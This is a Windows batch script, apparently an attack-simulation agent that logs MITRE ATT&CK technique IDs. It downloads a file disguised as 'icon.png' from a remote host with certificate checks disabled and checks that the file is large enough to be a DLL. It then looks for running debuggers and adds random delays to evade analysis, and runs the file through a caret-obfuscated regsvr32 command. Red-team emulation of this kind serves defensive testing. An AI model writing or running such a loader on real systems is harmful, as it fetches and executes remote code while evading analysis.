@echo off
SETLOCAL EnableDelayedExpansion

SET xqwer=%APPDATA%\11052\00b86fb0
SET asdfg=680b5140.txt
SET zxcvb=https://10.0.0.49/stage/2/icon.png?11052-7
SET qwert=BALAM-S2BO
SET yuioi=11052
SET hjklz=7
SET nmkl=%PUBLIC%\\macula-simulations.log
SET poiuy=https://10.0.0.49

SET tsvar=!DATE!/!TIME!
SET logfile=!nmkl!
SET agentname=!qwert!
SET simid=!yuioi!
SET outputdir=!xqwer!
SET outputfile=!asdfg!
SET heartbeat=!zxcvb!

timeout /t 15 /nobreak >nul
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_start>> "!logfile!" 2>nul

curl -k -s -o "!outputdir!\!outputfile!" "!heartbeat!"
SET hb_el=!errorlevel!
IF !hb_el! EQU 0 (
    set heart_result=OK
    set heart_error=
) ELSE (
    set heart_result=FAIL
    set heart_error=curl_exit_!hb_el!
)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_complete=!heart_result!>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_result=!hb_el!>> "!logfile!" 2>nul

IF !hb_el! NEQ 0 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_abort=no_dll>> "!logfile!" 2>nul
    goto :done
)

SET dll_size=0
FOR %%I IN ("!outputdir!\!outputfile!") DO SET dll_size=%%~zI
IF !dll_size! LSS 1024 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: dll_size_fail=!dll_size!>> "!logfile!" 2>nul
    goto :done
)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: dll_size_ok=!dll_size!>> "!logfile!" 2>nul

ping -n 10 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!outputdir!" >nul 2>&1
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul

wmic process where "CommandLine like '%%windbg%%' or CommandLine like '%%x64dbg%%' or CommandLine like '%%devenv%%'" get ProcessID /format:csv 2>nul | find /i "ProcessId" >nul
IF !ERRORLEVEL! EQU 0 (
    SET /A debugdelay= %RANDOM% %% 3 + 2
    timeout /t !debugdelay! /nobreak >nul
)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: debugger_check_done>> "!logfile!" 2>nul

SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

SET fra1=r^e^g^s^v^r
SET fra2=3^2^.
SET fra3=e^x^e
SET fra4=/^s
CALL SET cmd=%%fra1%%%%fra2%%%%fra3%% %fra4%
echo [!tsvar!][DEBUG][!agentname!][!simid!]: regsvr32_start>> "!logfile!" 2>nul
!cmd! "!outputdir!\!outputfile!" >nul 2>&1
SET lolbin_el=!errorlevel!
echo [!tsvar!][DEBUG][!agentname!][!simid!]: regsvr32_result=!lolbin_el!>> "!logfile!" 2>nul

IF !lolbin_el! EQU 0 (
    echo [!tsvar!][TTP][!agentname!][!simid!]: T1218^|System Binary Proxy Execution=OK:>> "!logfile!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!agentname!][!simid!]: T1218^|System Binary Proxy Execution=FAIL:!lolbin_el!>> "!logfile!" 2>nul
)
echo [!tsvar!][TTP][!agentname!][!simid!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!logfile!" 2>nul
echo [!tsvar!][TTP][!agentname!][!simid!]: T1027^|Obfuscated Files or Information=OK:>> "!logfile!" 2>nul

:done
exit /b 0
